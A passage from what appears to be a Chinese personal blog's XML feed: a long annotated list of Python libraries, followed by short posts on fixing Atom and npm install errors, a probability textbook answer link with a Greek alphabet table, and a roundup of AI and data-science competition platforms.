CMS的插件，内联编辑和性能优化。</p><p>FeinCMS，基于Django的先进内容管理系统。</p><p>Kotte，高层次的Python的Web应用框架，基于Pyramid。</p><p>Mezzanine，强大，一致，灵活的内容管理平台。</p><p>Opps，基于Django的CMS，用于高流量的报纸、杂志和门户网站。</p><p>Plone，基于Zope的开源应用服务器Zope。</p><p>Quokka，灵活，可扩展的，轻量级的CMS系统，使用Flask和MongoDB。</p><p>Wagtail，Django内容管理系统。</p><p>Widgy，CMS框架，基于Django。</p><p>django-oscar，Django奥斯卡，开源的电子商务框架。</p><p>django-shop，基于Django的网店系统。</p><p>merchant，支持多种付款处理工具。</p><p>money，可扩展的货币兑换解决方案。</p><p>python-currencies，货币显示格式。</p><p>cornice，Pyramid的REST框架。</p><p>django-rest-framework，Django框架，强大灵活的工具，可以很容易地构建Web API。</p><p>django-tastypie，创造精美的Django应用程序API接口。</p><p>django-formapi，创建JSON API、HMAC认证和Django表单验证。</p><p>flask-api，提供统一的浏览器体验，基于Django框架。</p><p>flask-restful，快速构建REST API支持扩展。</p><p>flask-api-utils，flask的扩展。</p><p>falcon，猎鹰，高性能的Python框架，构建云API和Web应用程序后端。</p><p>eve，夏娃，REST API框架，使用Flask，MongoDB和良好意愿。</p><p>sandman，睡魔，为现有的数据库驱动的系统，自动生成REST API。</p><p>restless，类似TastyPie的框架。</p><p>savory-pie，REST API构建函数库（Django，及其他）Jinja2，现代设计师友好的语言模板。</p><p>Genshi，网络感知输出模板工具包。</p><p>Mako，马可，Python平台的超高速、轻型模板。</p><p>Chameleon，变色龙，一个HTML / XML模板引擎。仿照ZPT，优化速度。</p><p>Spitfire，快速的Python编译模板。</p><p>django-haystack,大海捞针,Django模块搜索。</p><p>elasticsearch-py,Elasticsearch官方低级的Python客户端。</p><p>solrpy,solr客户端。</p><p>Whoosh,呼,快速，纯Python搜索引擎库。</p><p>Feedly，建立新闻和通知系统的函数库，使用Cassandra和Redis。</p><p>django-activity-stream,Django活动流,从你网站上的行动,产生通用的活动流。</p><p>Beaker，烧杯，一个缓存和会话使用的Web应用程序，独立的Python脚本和应用程序库。</p><p>dogpile.cache，是Beaker作者的下一代替代作品。</p><p>HermesCache，Python的缓存库，基于标签的失效及预防Dogpile效果。</p><p>django-cache-machine，Django缓存机，自动缓存失效，使用ORM。</p><p>django-cacheops，自动颗粒事件驱动，ORM缓存失效。</p><p>johnny-cache,约翰尼高速缓存框架,Django应用程序。</p><p>django-viewlet,渲染模板部件扩展缓存控制。</p><p>pylibmc,在libmemcached接口。</p><p>WTForms-JSON,JSON表单数据处理扩展。</p><p>Deform， HTML表单生成的函数库。</p><p>django-bootstrap3，bootstrap3，集成了Django。</p><p>django-crispy-forms，Django程序，可以创建优雅的表单。</p><p>django-remote-forms，Django的远程表单，Django表格的序列化程序。</p><p>django-simple-spam-blocker，Django简单的垃圾邮件拦截器。</p><p>django-simple-captcha，Django简单验证码，简单的和高度可定制的Django应用程序，用于添加验证码图像Ajenti，服务器管理面板。</p><p>Grappelli，界面花哨的django皮肤。</p><p>django-suit，Django替代o界面（仅用于非商业用途）。</p><p>django-xadmin，Django管理面板替代工具。</p><p>flask-admin，简单的flask管理界面框架flower，实时监控和Web管理面板。</p><p>Pelican，鹈鹕，Markdown或ReST，字王内容主题。支持 DVCS, Disqus. AGPL。</p><p>Cactus,仙人掌,设计师的网站静态生成器。</p><p>Hyde，海德， 基于Jinja2的静态网站生成器。</p><p>Nikola，尼古拉-一个静态网站和博客生成器。</p><p>Tags，标签，最简单的静态网站生成器。</p><p>Tinkerer，工匠，基于Sphinx的静态网站生成器。</p><p>asyncio，（在Python 3.4 +是Python标准库），异步I/O，事件循环，协同任务。</p><p>gevent，基于Python的网络库。</p><p>Twisted，扭曲，事件驱动的网络引擎。</p><p>Tornado，龙卷风，Web框架和异步网络的函数库。</p><p>pulsar，脉冲星，事件驱动的并行框架的Python。</p><p>diesel，柴油，绿色的，基于事件的I/O框架。</p><p>eventlet，WSGI支持异步框架。</p><p>pyzmq， 0MQ消息库的Python封装。</p><p>txZMQ,基于Twisted的0MQ消息库封Crossbar,开源统一应用路由器（WebSocket和WAMP）。</p><p>wsgiref，Python标准库，WSGI封装实现，单线程。</p><p>Werkzeug，机床，WSGI工具函数库，很容易地嵌入到你自己的项目框架。</p><p>paste，粘贴，多线程，稳定的，久经考验的WSGI工具。</p><p>rocket，火箭，多线程服务，基于Pyramid。</p><p>netius，快速的、异步WSGI服务器，gunicorn，forked前身，部分用C写的。</p><p>fapws3，异步网络，用C写的。</p><p>meinheld，异步WSGI服务器，是用C写的。</p><p>bjoern，-快速的、异步WSGI服务器，用C写的。</p><p>安全</p><p>Permissions函数库，允许或拒绝用户访问数据或函数。</p><p>django-guardian,Django守护者，管理每个对象的权限，用于Django 1.2 +Carteblanche，管理导航和权限。</p><p>Authomatic，简单强大的认证/授权客户端。</p><p>OAuthLib， 通用，规范，OAuth请求签约工具。</p><p>rauth，用于OAuth 1.0，2.0，的Python库。</p><p>python-oauth2，利用全面测试，抽象接口来创建OAuth的客户端和服务器。</p><p>python-social-auth，易于安装的社会认证机制。</p><p>django-oauth-toolkit,Django OAuth工具包django-oauth2-provider,Django OAuth2工具包。</p><p>django-allauth，Django认证的应用程序。</p><p>Flask-OAuthlib，Flask的OAuth工具包sanction，制裁，简单的oauth2客户端。</p><p>jose，[JavaScript]对象签名和加密(JOSE)草案实施，标记状态。</p><p>python-jwt，JSON的Web令牌生成和验证模块。</p><p>pyjwt，JSON的Web令牌草案01。</p><p>python-jws，JSON的Web令牌草案02。</p><p>PyCrypto，Python的加密工具包。</p><p>Paramiko，sshv2协议的实现，提供了客户端和服务器端的功能。</p><p>cryptography，密码开发工具包。</p><p>PyNac，网络和密码（NaCl）函数库。</p><p>hashids，hashids的 Python函数库。</p><p>Passlib，安全的密码存储/哈希库，非常高的水平。</p><p>hashlib,md5, sha等hash算法，用来替换md5和sha模块，并使他们的API一致。</p><p>它由OpenSSL支持，支持如下算法：md5,sha1, sha224, sha256, sha384, sha512.</p><p>GUI库</p><p>名称简介PyGtk，基于Python的GUI程序开发GTK+库PyQt用于Python的QT开发库WxPythonPython下的GUI编程框架，其消息机制与MFC的架构相似,入门非常简单，需要快速开发相关的应用可以使用这个TkinterPython下标准的界面编程包，因此不算是第三方库了PySide，跨平台Qt的应用程序和用户界面框架，支撑Qt v4框架。</p><p>wxPython，混合wxWidgets的C++类库。</p><p>kivy，创建应用程序GUI函数库，看运行于Windows，Linux，MAC OS X，[Android]和[iOS]。</p><p>curse，用于创建终端GUI应用程序。</p><p>urwid，创建终端GUI应用程序窗体的函数库，支持事件，色彩丰富。</p><p>pyglet，跨平台的窗口和多媒体库的Python。</p><p>Tkinter，是Python事实上的标准GUI软件包。</p><p>enaml，创建漂亮的用户界面，语法类似QML。</p><p>Toga，托加，OS原生GUI工具包。【构建封装】</p><p>pyenv,简单的Python版本管理。</p><p>virtualenv,创建独立的Python环境，用于同时安装不同版本的python环境。</p><p>virtualenvwrapper，是virtualenv的一组扩展。</p><p>pew,一套管理多个虚拟环境的工具。</p><p>vex，使运行指定的virtualenv命令。</p><p>PyRun，一个单文件，无需安装的Python版本管理工具。</p><p>PIP，Python包和依赖的管理工具。</p><p>easy_install，软件包管理系统,提供一个标准的分配Python软件和 函式库的格式。是一个附带设置工具的模块，和一个第三方函式库。旨在加快Python函式库的分配程式的速度。类似Ruby语言的RubyGems 。</p><p>conda，跨平台，二进制软件包管理器。</p><p>Curdling，一个管理Python包的命令行工具。</p><p>wheel，Python发行的新标准，旨在替代eggs.cx-Freeze，跨平台的，用于打包成可执行文件的库</p><p>py2exe, Windows平台的Freeze脚本工具，Py2exe ，将python脚本转换为windows上可以独立运行的可执行程序py2app，MAC OS X平台的Freeze脚本工具。</p><p>pyinstaller，-转换成独立的可执行文件的Python程序（跨平台）。</p><p>pynsist,构建Windows安装程序的工具，用Python编写。</p><p>dh-virtualenv,建立和分发virtualenv(Debian软件包格式)</p><p>PyPI，新一代的Python包库管理工具。warehouse,新一代的Python包库（PyPI）管理工具。</p><p>devpi，PyPI服务器和包装/测试/发布工具。</p><p>localshop，PyPI官方包镜像服务器，支持本地（私人）包上传。</p><p>buildout，创建，组装和部署应用程序的多个部分，其中一些可能是非基于Python的。</p><p>SCons，软件构造工具。</p><p>platformio，一个控制台的工具，构建的代码可用于不同的开发平台。</p><p>bitbake，特殊设计的工具，用于创建和部署[嵌入式]Linux软件包</p><p>fabricate，自动为任何编程语言，生成依赖包。</p><p>django-compressor，Django压缩机，压缩和内联JavaScript或CSS，链接到一个单一的缓存文件。</p><p>jinja-assets-compressor，金贾压缩机，一个Jinja扩展，通过编译，压缩你的资源。</p><p>webassets，优化管理，静态资源，独特的缓存清除。</p><p>fanstatic，球迷，包优化，提供静态文件。</p><p>fileconveyor，监控资源变化，，可保存到CDN（内容分发网络）和文件系统。</p><p>django-storages，一组自定义存储Django后台。</p><p>glue，胶胶，一个简单的命令行工具，生成CSS Sprites。</p><p>libsass-python，Sass (层叠样式表)的Python接口。</p><p>Flask-Assets，整合应用程序资源。【代码调试】</p><p>unittest，Python标准库，单元测试框架。</p><p>nose，鼻子，unittest延伸产品。</p><p>pytest，成熟的全功能的Python测试工具。</p><p>mamba，曼巴，Python的权威测试工具，出自BDD的旗下。</p><p>contexts，背景，BDD测试框架，基于C#。</p><p>pyshould，should风格的测试框架，基于PyHamcrest.pyvows，BDD风格测试框架Selenium，web测试框架，Python绑定Selenium。</p><p>splinter，分裂，测试Web应用程序的开源工具。</p><p>locust，刺槐，可扩展的用户负载测试工具，用Python写的。</p><p>sixpack，语言无关的A/B测试框架。</p><p>mock，模拟对象（英语：mock object，也译作模仿对象），模拟测试库。</p><p>responses，工具函数，用于mock模拟测试。</p><p>doublex-强大的测试框架。</p><p>freezegun，通过时间调整，测试模块。</p><p>httpretty， HTTP请求的模拟工具。</p><p>httmock，mock模拟测试。</p><p>coverage，代码覆盖度量测试。</p><p>faker，生成模拟测试数据的Python包。</p><p>mixer，混频器，产生模拟数据，用于Django ORM，SQLAlchemy，Peewee, MongoEngine, Pony ORM等model_mommy，在Django创建测试随机工具。</p><p>ForgeryPy，易用的模拟数据发生器。</p><p>radar，雷达，生成随机日期/时间。</p><p>FuckIt.py，测试Python代码运行。</p><p>Code Analysispysonar2，Python类型索引。</p><p>pycallgraph,可视化的流量（调用图）应用程序。</p><p>code2flow,转换Python和JavaScript代码到流程图。</p><p>LinterFlake8，源代码模块检查器pylama，Python和JavaScript代码审计工具。</p><p>Pylint，源代码分析器，它查找编程错误，帮助执行一个代码标准和嗅探一些代码味道。注意：相比于PyChecker，Pylint是一个高阶的Python代码分析工具，它分析Python代码中的错误。</p><p>Pyflakes，一个用于检查Python源文件错误的简单程序。Pyflakes分析程序并且检查各种错误。它通过解析源文件实现，无需导入。</p><p>pdb,Python标准库,Python调试器。</p><p>ipdb,IPython使用的PDB。</p><p>winpdb，独立于平台的GUI调试器。</p><p>pudb，全屏，基于python调试控制台。</p><p>pyringe，-可附着于及注入代码到Python程序的调试器。</p><p>python-statsd，statsd服务器客户端。</p><p>memory_profiler， 内存监视。</p><p>profiling，交互式Python分析器。</p><p>django-debug-toolbar, Django调试工具栏,显示各种调试信息:当前请求/响应。django-devserver,Django调试工具。</p><p>flask-debugtoolbar,flask调试工具。</p>]]></content>
      
      <categories>
          
          <category> 程序设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>windows 安装 Atom 失败，出现update已停止工作</title>
      <link href="/2019/08-18-atom-error-resolve.html"/>
      <url>/2019/08-18-atom-error-resolve.html</url>
      <content type="html"><![CDATA[<p>我是在最近重装系统后，安装atom时使用.exe安装失败，出现如下错误:<br><img src="/article_img/atom-solution.png" alt="&quot;atom-solution&quot;"></p><p>最后通过换安装方式解决的：我使用的是atom-windows.zip<br>安装包地址如下:<br><a href="https://github.com/atom/atom/releases/tag/v1.40.0" target="_blank" rel="noopener">https://github.com/atom/atom/releases/tag/v1.40.0</a></p>]]></content>
      
      <categories>
          
          <category> problem-solution </category>
          
      </categories>
      
      
        <tags>
            
            <tag> atom </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>npm ERR! Unexpected end of JSON input while parsing near和npm ERR! code EINTEGRITY</title>
      <link href="/2019/06-29-npm-error-resolve.html"/>
      <url>/2019/06-29-npm-error-resolve.html</url>
      <content type="html"><![CDATA[<p>最近有一段时间没用npm再用的时候发现了不少错误，在使用npm install的时候出现npm ERR! Unexpected end of JSON input while parsing near等等提示，开始用了网上给出了清理cache等方法，比如<a href="https://www.cnblogs.com/gitnull/p/10193382.html" target="_blank" rel="noopener">https://www.cnblogs.com/gitnull/p/10193382.html</a> 给出的，试了挺久发现对我的问题不适用，没解决，在卸掉npm重装之后还是出现这种问题，最后我换了个思路，把配置npm的全局模块的存放路径以及cache的路径给换掉之后解决了此问题，具体是什么原因导致这种问题的我也比较模糊，魔性问题，下面给出我的解决方案。</p><h1 id="配置npm的全局模块的存放路径以及cache的路径"><a href="#配置npm的全局模块的存放路径以及cache的路径" class="headerlink" title="配置npm的全局模块的存放路径以及cache的路径"></a>配置npm的全局模块的存放路径以及cache的路径</h1><p>在cmd中输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config set prefix &quot;a:/nodejs/node_global&quot;</span><br><span class="line">npm config set cache &quot;a:/nodejs/node_cache&quot;</span><br></pre></td></tr></table></figure><p>tip:如果出现命令找不到的提示说明没加入到环境变量中，把npm安装的目录放到PATH环境中（WINDOWS下）</p><p>上面俩个命令执行成功会在nodejs文件夹中创建两个文件夹，”node_global”及”node_cache” ，这个nodejs文件夹不是固定的，随你自己设定一个目录，路径填正确了，执行之后如下图所示：</p><div align="center">!["npm_error-1"](/article_img/npm_error-1.png)</div><p>接下来就是正常的npm的安装操作了</p><h1 id="设置淘宝镜像"><a href="#设置淘宝镜像" class="headerlink" title="设置淘宝镜像"></a>设置淘宝镜像</h1><p>我自己用的就是这个镜像</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry http://registry.cnpmjs.org</span><br></pre></td></tr></table></figure><h1 id="安装测试一下"><a href="#安装测试一下" class="headerlink" title="安装测试一下"></a>安装测试一下</h1><p>顺便安装个镜像管理工具，方便之后镜像源更改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g nrm</span><br></pre></td></tr></table></figure><p>这一步没有出现问题的话就相当于解决了</p><h2 id="展开镜像源"><a href="#展开镜像源" class="headerlink" title="展开镜像源"></a>展开镜像源</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nrm ls</span><br></pre></td></tr></table></figure><p>如果出现命令找不到，就把刚刚的a:/nodejs/node_global加到环境变量里面，具体看你自己设的目录</p><p>成功会展示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Admin&gt;nrm ls</span><br><span class="line"></span><br><span class="line">  npm ---- https://registry.npmjs.org/</span><br><span class="line">  cnpm --- http://r.cnpmjs.org/</span><br><span class="line">  taobao - https://registry.npm.taobao.org/</span><br><span class="line">  nj ----- https://registry.nodejitsu.com/</span><br><span class="line">  npmMirror  https://skimdb.npmjs.com/registry/</span><br><span class="line">  edunpm - http://registry.enpmjs.org/</span><br></pre></td></tr></table></figure><p>之后可以利用nrm use 镜像名 设置镜像源</p>]]></content>
      
      <categories>
          
          <category> problem-solution </category>
          
      </categories>
      
      
        <tags>
            
            <tag> npm </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>概率论与数理统计习题答案(第二版) 范大茵 陈永华编</title>
      <link href="/2019/05-06-college-probability.html"/>
      <url>/2019/05-06-college-probability.html</url>
      <content type="html"><![CDATA[<p>答案链接:<a href="https://wenku.baidu.com/view/c397ccf02cc58bd63086bd31.html?pn=51" target="_blank" rel="noopener">https://wenku.baidu.com/view/c397ccf02cc58bd63086bd31.html?pn=51</a></p><h1 id="附加"><a href="#附加" class="headerlink" title="附加"></a>附加</h1><h2 id="希腊字母表"><a href="#希腊字母表" class="headerlink" title="希腊字母表"></a>希腊字母表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">希腊字母读法:</span><br><span class="line">Α α：阿尔法 Alpha</span><br><span class="line">Β β：贝塔 Beta</span><br><span class="line">Γ γ：伽玛 Gamma</span><br><span class="line">Δ δ：德尔塔 Delte</span><br><span class="line">Ε ε：艾普西龙 Epsilon</span><br><span class="line">Ζ ζ ：捷塔 Zeta</span><br><span class="line">Ε η：依塔 Eta</span><br><span class="line">Θ θ：西塔 Theta</span><br><span class="line">Ι ι：艾欧塔 Iota</span><br><span class="line">Κ κ：喀帕 Kappa</span><br><span class="line">∧ λ：拉姆达 Lambda</span><br><span class="line">Μ μ：缪 Mu</span><br><span class="line">Ν ν：拗 Nu</span><br><span class="line">Ξ ξ：克西 Xi</span><br><span class="line">Ο ο：欧麦克轮 Omicron</span><br><span class="line">∏ π：派 Pi</span><br><span class="line">Ρ ρ：柔 Rho</span><br><span class="line">∑ σ：西格玛 Sigma</span><br><span class="line">Τ τ：套 Tau</span><br><span class="line">Υ υ：宇普西龙 Upsilon</span><br><span class="line">Φ φ：fai Phi</span><br><span class="line">Χ χ：器 Chi</span><br><span class="line">Ψ ψ：普赛 Psi</span><br><span class="line">Ω ω：欧米伽 Omega</span><br><span class="line">希腊字母读法:</span><br><span class="line">Α α：阿尔法 Alpha</span><br><span class="line">Β β：贝塔 Beta</span><br><span class="line">Γ γ：伽玛 Gamma</span><br><span class="line">Δ δ：德尔塔 Delte</span><br><span class="line">Ε ε：艾普西龙 Epsilon</span><br><span class="line">Ζ ζ ：捷塔 Zeta</span><br><span class="line">Ε η：依塔 Eta</span><br><span class="line">Θ θ：西塔 Theta</span><br><span class="line">Ι ι：艾欧塔 Iota</span><br><span class="line">Κ κ：喀帕 Kappa</span><br><span class="line">∧ λ：拉姆达 Lambda</span><br><span class="line">Μ μ：缪 Mu</span><br><span class="line">Ν ν：拗 Nu</span><br><span class="line">Ξ ξ：克西 Xi</span><br><span class="line">Ο ο：欧麦克轮 Omicron</span><br><span class="line">∏ π：派 Pi</span><br><span class="line">Ρ ρ：柔 Rho</span><br><span class="line">∑ σ：西格玛 Sigma</span><br><span class="line">Τ τ：套 Tau</span><br><span class="line">Υ υ：宇普西龙 Upsilon</span><br><span class="line">Φ φ：fai Phi</span><br><span class="line">Χ χ：器 Chi</span><br><span class="line">Ψ ψ：普赛 Psi</span><br><span class="line">Ω ω：欧米伽 Omega</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 大学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概率论 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>人工智能、大数据相关比赛信息收集</title>
      <link href="/2019/05-04-Artificial-competition.html"/>
      <url>/2019/05-04-Artificial-competition.html</url>
      <content type="html"><![CDATA[<h1 id="国外-overseas"><a href="#国外-overseas" class="headerlink" title="国外 overseas"></a>国外 overseas</h1><h2 id="kaggle数据科学竞赛-Competitions-Kaggle"><a href="#kaggle数据科学竞赛-Competitions-Kaggle" class="headerlink" title="kaggle数据科学竞赛 - Competitions | Kaggle"></a>kaggle数据科学竞赛 - Competitions | Kaggle</h2><p>Kaggle号称是全球最大的数据科学家汇聚的平台，高手云集，同时对萌新也很友好。<br>Kaggle 上有两个最适合新手的竞赛（某种程度上已成为 Kaggle 的「入门教程」）：<br>Titanic（预测生存：一种二元分类问题）：<a href="https://www.kaggle.com/c/titanic" target="_blank" rel="noopener">https://www.kaggle.com/c/titanic</a><br>房价（预测价格：回归问题）：<a href="https://www.kaggle.com/c/house-prices-advanced-regression-techniques" target="_blank" rel="noopener">https://www.kaggle.com/c/house-prices-advanced-regression-techniques</a><br>强烈建议你有时间两项都尝试一下，对入门学习是很有益处的！</p><h1 id="国内（domestic-inland-）"><a href="#国内（domestic-inland-）" class="headerlink" title="国内（domestic inland ）"></a>国内（domestic inland ）</h1><p>国内是看到了AI在未来的重要性，各个公司已经相应投资者纷纷开设了很多相关的比赛及平台，下面说下我所知道的。</p><h2 id="阿里云天池大赛"><a href="#阿里云天池大赛" class="headerlink" title="阿里云天池大赛"></a>阿里云天池大赛</h2><p>2015年3月23日，阿里云计算宣布启动新一赛季的天池大数据竞赛，到目前为止，已经加入了很多，比如算法大赛，程序设计大赛，为新手准备的入门赛，还有可视化大赛，千里马大赛，创新应用大赛。门类相对来说非常齐全。 而且一般比赛持续周期很长，大家可以择机参加。</p><h2 id="DF-CCF指定专业大数据竞赛平台"><a href="#DF-CCF指定专业大数据竞赛平台" class="headerlink" title="DF,CCF指定专业大数据竞赛平台"></a>DF,CCF指定专业大数据竞赛平台</h2><p>DF(DataFountain)的目标是构建中国最有影响力和权威度的数据科学与大数据分析处理竞赛平台。大赛的奖池规模很大，而且备考中国计算机学会这种国家学会，和很多优秀企业开办比赛，平台竞赛数量质量越来越高，CCF每年的大赛都是DF组织的，影响力挺大的，平台参与人数也挺多。</p><h2 id="AI-Challenger-全球AI挑战赛"><a href="#AI-Challenger-全球AI挑战赛" class="headerlink" title="AI Challenger - 全球AI挑战赛"></a>AI Challenger - 全球AI挑战赛</h2><p>“AIChallenger全球AI挑战赛”。是由创新工场、搜狗和今日头条联合宣布三方携手发起的。 AI Challenger 全球AI挑战赛”是面向全球人工智能人才的开源数据集和编程竞赛平台，致力于满足AI人才成长对高质量丰富数据集的需求，推动AI在科研与商业领域结合来解决真实世界的问题。 2017年才举办第一期，现在2018年8月第二期开始啦。 这个比赛数据集很大，都是解决实际问题，难度较高，当然，奖金特别高，一般都是公司或者高校团队参加。</p><h2 id="FlyAI-AI竞赛服务平台"><a href="#FlyAI-AI竞赛服务平台" class="headerlink" title="FlyAI-AI竞赛服务平台"></a>FlyAI-AI竞赛服务平台</h2><p>新发现的一个AI竞赛平台，比赛类型分为图像，自然语言处理，语音这三块，比赛形式每提交一次代码只要符合条件就有奖金。个人觉得这种形式还是挺好的，真的有助于全民AI的氛围形成。 FlyAI 新一代AI竞赛社区 FlyAI是游戏化AI竞赛服务平台，吸引国内外优秀的AI开发者和AI需求者，让AI从科学家社区走向工程师社区。它不仅仅是开发者社区，而是未来企业个性化AI解决方案的核心，也是未来AI行业生态的起点。目前平台已注册3000人，拥有近50个AI项目（可执行代码、规范化数据、可用模型），接下来将会通过技术论坛、资讯网站、校园等途径不断发掘吸引AI人才。</p><h2 id="数据竞赛平台-biendata"><a href="#数据竞赛平台-biendata" class="headerlink" title="数据竞赛平台 - biendata"></a>数据竞赛平台 - biendata</h2><p>Biendata.com是一个人工智能竞赛学习平台。用户可通过该平台报名并参加人工智能领域各类赛事。 这项比赛奖金也是很丰厚的，不过也是难度较高，一般公司或者高校团队参加。 最近有一个比赛是： 中国人工智能学会 &amp; 字节跳动 办的为字节跳动海外产品文章自动生成标题，感觉还是挺有意思的。</p><h2 id="科赛-Kesci-com"><a href="#科赛-Kesci-com" class="headerlink" title="科赛- Kesci.com"></a>科赛- Kesci.com</h2><p>科赛(Kesci.com)是聚合数据人才和行业问题的在线社区。科赛打造的 K-Lab 在线数据分析协作平台,为数据工作者的学习和工作带来全新的体验。 比赛有简单，有难，有些有奖金，有些没有，可能知名度没有前几个高</p><h2 id="数愿大数据AI竞赛平台"><a href="#数愿大数据AI竞赛平台" class="headerlink" title="数愿大数据AI竞赛平台"></a>数愿大数据AI竞赛平台</h2><p>致力于打造一流高度专业化大数据人工智能竞赛,挖掘优质人才和数据价值,推动项目商业化落地,助力创业者实现梦想 奖励丰厚，大多和创业相关，知名度不高，不过价值很高，可以多多参与。</p><h2 id="关注智能生活的黑客大赛GeekPwn"><a href="#关注智能生活的黑客大赛GeekPwn" class="headerlink" title="关注智能生活的黑客大赛GeekPwn"></a>关注智能生活的黑客大赛GeekPwn</h2><p>大赛主要聚焦人工智能安全问题<br>聚焦机器学习对抗训练 全球首创AI对抗样本攻防赛CAAD CTF CAAD对抗样本攻防赛是GeekPwn2018推出的全新挑战项目，聚焦人工智能领域潜在安全问题，旨在通过专业的技术比拼，选手在现场进行实时攻击与防守比赛，提前预演人工智能应用潜在的安全风险，保护人工智能健康成长。<br>GeekPwn2018嘉年华将于2018 年10月24日-25日在上海举行。届时CAAD 对抗样本攻防赛、数据追踪挑战赛、黑客屋挑战赛、机器特工挑战赛、PWN FOR FUN趣味挑战赛、基于漏洞和非基于漏洞挑战赛轮番上演</p><h1 id="其他公司比赛"><a href="#其他公司比赛" class="headerlink" title="其他公司比赛"></a>其他公司比赛</h1><p>以上都是大家可能比较熟知的比赛平台，但也有一些公司自己举办的非常好的AI比赛平台。<br>京东大赛：<a href="http://jddjr.jd.com/" target="_blank" rel="noopener">http://jddjr.jd.com/</a><br>CSDN- tinymind比赛：<a href="https://www.tinymind.cn/competitions" target="_blank" rel="noopener">https://www.tinymind.cn/competitions</a><br>baidu点石： <a href="http://dianshi.baidu.com/gemstone/home" target="_blank" rel="noopener">http://dianshi.baidu.com/gemstone/home</a><br>AI开发者大赛 - 讯飞开放平台：<a href="http://challenge.xfyun.cn/" target="_blank" rel="noopener">http://challenge.xfyun.cn/</a><br>腾讯云竞赛平台：<a href="https://cloud.tencent.com/developer/contests" target="_blank" rel="noopener">https://cloud.tencent.com/developer/contests</a><br>爱奇艺AI竞赛平台：<a href="http://challenge.ai.iqiyi.com/" target="_blank" rel="noopener">http://challenge.ai.iqiyi.com/</a><br>ATEC蚂蚁开发者大会： <a href="https://dc.cloud.alipay.com/index#/home" target="_blank" rel="noopener">https://dc.cloud.alipay.com/index#/home</a><br>泰迪杯-泰迪公司：<a href="http://www.tipdm.org/bdrace/jingsa/" target="_blank" rel="noopener">http://www.tipdm.org/bdrace/jingsa/</a><br>竞技乎–最近没什么动静</p><h1 id="平台"><a href="#平台" class="headerlink" title="平台"></a>平台</h1><p>•    珠算，它提供了一个Python编程库，能够便捷地实现贝叶斯深度学习的建模和推理。<br>Studys<br>•    比xgboost强大的LightGBM:调参指南(带贝叶斯优化代码) - CSDN博客<br>•    主流机器学习模型模板代码+经验分享[xgb, lgb, Keras, LR]<br>深度学习中经常看到epoch、iteration和batchsize，下面按照自己的理解说说这三个区别：<br>（1）batchsize：批大小。在深度学习中，一般采用SGD训练，即每次训练在训练集中取batchsize个样本训练；<br>（2）iteration：1个iteration等于使用batchsize个样本训练一次；<br>（3）epoch：1个epoch等于使用训练集中的全部样本训练一次；<br>举个例子，训练集有1000个样本，batchsize=10，那么： 训练完整个样本集需要： 100次iteration，1次epoch。<br>AI_competitions_code<br>马上消费金融挑战者大赛-违约用户风险预测–第三名方案:chizhu/AI_Risk<br>第一届腾讯社交广告高校算法大赛(全国14名): freelzy / Tencent_Social_Ads<br>2017-CCF-BDCI-让AI当法官(初赛):ShawnyXiao/2017-CCF-BDCI-AIJudge<br>初赛Rank1 复赛Rank1 2018 CCF 大数据与计算智能大赛 供应链需求预测：yuxiaowww/BDCI-2018-Supply-Chain-Demand-Forecast<br>招商银行信用卡中心 消费金融场景下的用户购买预测 rank1: sunwantong/China-Merchants-Bank-credit-card-Cente-User-purchase-forecast</p>]]></content>
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Competition </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>matlab使用sym出现警告提示</title>
      <link href="/2019/03-13-matlab-qus1.html"/>
      <url>/2019/03-13-matlab-qus1.html</url>
